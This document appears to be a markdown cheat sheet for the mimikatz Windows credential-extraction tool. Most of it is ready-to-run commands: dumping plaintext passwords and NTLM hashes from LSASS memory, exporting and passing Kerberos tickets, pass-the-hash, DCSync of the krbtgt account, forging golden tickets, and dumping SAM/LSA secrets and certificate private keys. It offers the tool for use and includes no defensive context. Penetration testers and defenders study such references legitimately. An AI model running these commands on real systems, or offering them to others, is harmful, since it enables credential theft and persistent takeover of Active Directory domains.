---
title: mimikatz
category: credential-extraction
tags:
  - windows
  - credentials
  - post-exploitation
  - kerberos
  - active-directory
os: windows
url: https://github.com/gentilkiwi/mimikatz
---

# mimikatz

## Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Key Modules](#key-modules)
- [Common Operations](#common-operations)
- [Documentation](#documentation)

## Overview

Mimikatz is a Windows credential extraction and manipulation tool. It extracts plaintext passwords, NTLM hashes, PIN codes, and Kerberos tickets from memory. Key capabilities include:

- **Credential Extraction**: Dump passwords, hashes, and tickets from LSASS memory
- **Pass-the-Hash/Ticket**: Authenticate using extracted credentials without plaintext passwords
- **Golden/Silver Tickets**: Forge Kerberos tickets for persistent domain access
- **DCSync**: Replicate credentials from Domain Controllers without code execution
- **Certificate/Key Export**: Extract certificates and private keys from Windows stores

Requires administrator privileges and often `SeDebugPrivilege` for most operations.

## Quick Start

```
# Enable debug privileges (required for most operations)
privilege::debug

# Dump all logon credentials from memory
sekurlsa::logonpasswords

# Export Kerberos tickets
sekurlsa::tickets /export

# Pass-the-hash attack
sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd

# DCSync - extract credentials from DC
lsadump::dcsync /user:domain\krbtgt /domain:corp.local

# Create Golden Ticket
kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
```

## Key Modules

| Module | Purpose | Key Commands |
|--------|---------|--------------|
| `sekurlsa` | Extract credentials from LSASS | `logonpasswords`, `tickets`, `pth`, `ekeys` |
| `kerberos` | Kerberos ticket operations | `list`, `ptt`, `golden`, `silver`, `purge` |
| `lsadump` | LSA/SAM database dumping | `sam`, `secrets`, `cache`, `dcsync`, `trust` |
| `crypto` | Certificate/key operations | `certificates`, `keys`, `capi`, `cng` |
| `vault` | Windows Credential Vault | `cred`, `list` |
| `token` | Token manipulation | `elevate`, `revert`, `list`, `whoami` |
| `privilege` | Privilege management | `debug`, `backup`, `security` |
| `dpapi` | DPAPI secrets | `masterkey`, `chrome`, `cred` |
| `misc` | Miscellaneous utilities | `skeleton`, `memssp`, `cmd` |

## Common Operations

### Credential Extraction
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::ekeys
```

### Kerberos Attacks
```
# Export tickets
kerberos::list /export

# Pass-the-ticket
kerberos::ptt ticket.kirbi

# Golden ticket
kerberos::golden /admin:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ticket:golden.kirbi
```

### SAM/LSA Dump
```
token::elevate
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
```

### Certificate Export
```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::keys /export
```

## Documentation

| File | Description |
|------|-------------|
| [modules.md](modules.md) | Comprehensive module reference with attack examples |
| [official_docs.md](official_docs.md) | Official GitHub Wiki documentation |

### External Resources

- [GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [Official Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Releases](https://github.com/gentilkiwi/mimikatz/releases)
